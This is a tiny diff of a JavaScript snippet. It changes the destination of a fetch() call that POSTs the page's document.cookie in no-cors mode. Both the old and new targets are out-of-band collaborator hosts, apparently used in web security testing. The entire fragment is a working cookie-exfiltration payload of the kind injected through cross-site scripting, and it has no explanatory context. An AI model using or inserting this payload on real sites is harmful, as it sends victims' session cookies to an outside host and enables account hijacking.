@@ -1,4 +1,4 @@
-fetch('https://vsrbans5xq18rfeg6i0zor752w8mwb.oastify.com', {
+fetch('9kujhu5vf57s2iku5f5oeox6exkn8c.burpcollaborator.net', {
 method: 'POST',
 mode: 'no-cors',
 body:document.cookie
